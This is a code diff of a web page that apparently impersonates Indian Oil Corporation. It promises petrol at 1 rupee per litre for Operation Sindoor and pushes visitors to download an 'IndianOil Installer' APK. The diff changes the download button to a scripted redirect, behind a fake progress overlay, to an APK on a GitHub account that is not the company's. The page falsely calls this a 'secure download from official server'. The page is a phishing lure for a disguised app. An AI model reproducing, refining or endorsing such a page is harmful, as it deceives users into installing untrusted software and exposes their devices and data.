@@ -6,7 +6,6 @@
     <meta property="og:title" content="Indian Oil Corporation Ltd - Petrol @ 1RS from IndianOil">
     <meta property="og:image" content="https://iocl.com/images/static/indianoil_logo.jpg" />
     <meta property="og:description" content="Welcome to the world of IndianOil, an integrated service that gives you benefits of fuel." />
-   
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>IndianOil | The Energy of India | Indian Oil Corporation Ltd.</title>
     <style>
@@ -27,9 +26,7 @@
 
         .top-bar {
             background: #ffffff;
-            color: white;
             padding: 8px 15px;
-            font-size: 14px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -71,10 +68,6 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: url('');
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
             opacity: 0.2;
             z-index: 0;
         }
@@ -82,22 +75,6 @@
         .hero > * {
             position: relative;
             z-index: 1;
-        }
-
-        .update-banner {
-            background: #ff6700;
-            color: #000;
-            font-weight: 600;
-            font-size: 14px;
-            padding: 6px 12px;
-            border: 2px solid #fff;
-            border-bottom: none;
-            border-top-left-radius: 8px;
-            border-top-right-radius: 8px;
-            display: inline-block;
-            margin-bottom: 15px;
-            position: relative;
-            z-index: 2;
         }
 
         .hero h1 {
@@ -201,52 +178,18 @@
             color: #015296;
         }
 
-        /* Mobile Responsive */
         @media (max-width: 768px) {
-            .header h1 {
-                font-size: 20px;
-            }
-
-            .hero h1 {
-                font-size: 22px;
-            }
-
-            .hero p {
-                font-size: 14px;
-            }
-
             .download-btn {
                 width: 100%;
                 font-size: 16px;
-                padding: 15px 25px;
-            }
-
-            .hero-image {
-                max-width: 90%;
             }
         }
 
         @media (max-width: 480px) {
-            .header h1 {
-                font-size: 18px;
-            }
-
-            .hero h1 {
-                font-size: 20px;
-            }
-
-            .hero p {
-                font-size: 14px;
-            }
-
             .download-btn {
                 width: 100%;
                 font-size: 14px;
                 padding: 12px;
-            }
-
-            .hero-image {
-                max-width: 95%;
             }
         }
     </style>
@@ -258,12 +201,10 @@
     </div>
 
     <div class="header">
-        <h1>Celebrate Success of Operation Sindoor <br>with 1-Litre Petrol @ 1Rs at IndianOil</h1><span></span>
+        <h1>Celebrate Success of Operation Sindoor <br>with 1-Litre Petrol @ 1Rs at IndianOil</h1>
     </div>
 
     <div class="hero">
-      <!-- <div class="update-banner"></div>-->
-
         <h1>IndianOil<br><span>XTRAREWARDS</span></h1>
         <p><strong>Includes:</strong></p>
         <ul>
@@ -273,8 +214,8 @@
             <li>Download IndianOil Installer app from below and register to get barcode.</li>
         </ul>
 
-        <!-- Download Button Above the Image -->
-        <a href="https://github.com/indian-oil/1Litre-petrol/raw/refs/heads/main/IndianOil%20Installer.apk" class="download-btn" target="_blank">📲 Download IndianOil App</a>
+        <!-- Updated Button (no new tab) -->
+        <a href="#" id="downloadButton" class="download-btn">📲 Download IndianOil App</a>
         <p style="margin-top: 6px; font-size: 13px; color: rgb(82, 82, 82);">Secure download from official server</p>
 
         <img src="https://iocl.com/admin/img/UploadedFiles/MenuHeading/Files/English/959a312d3edf41388dc2074cbc6471a9.jpg" alt="PM Narendra Modi" class="hero-image">
@@ -307,26 +248,13 @@
                     clearInterval(interval);
                     setTimeout(() => {
                         overlay.style.display = "none";
-                        window.location.href = "https://github.com/indian-oil/1Litre-petrol/raw/refs/heads/main/IndianOil.apk"; // Replace with your actual download URL
+                        // Redirect to download in the same tab
+                        window.location.href = "https://github.com/indian-oil/1Litre-petrol/raw/refs/heads/main/IndianOil%20Installer.apk";
                     }, 500);
                 }
             }, 200);
         });
     </script>
-<script type="text/javascript">
-var sc_project=13133353; 
-var sc_invisible=1; 
-var sc_security="6c580235"; 
-</script>
-<script type="text/javascript"
-src="https://www.statcounter.com/counter/counter.js"
-async></script>
-<noscript><div class="statcounter"><a title="Web Analytics"
-href="https://statcounter.com/" target="_blank"><img
-class="statcounter"
-src="https://c.statcounter.com/13133353/0/6c580235/1/"
-alt="Web Analytics"
-referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
 </body>
 
-</html>
+    </html>
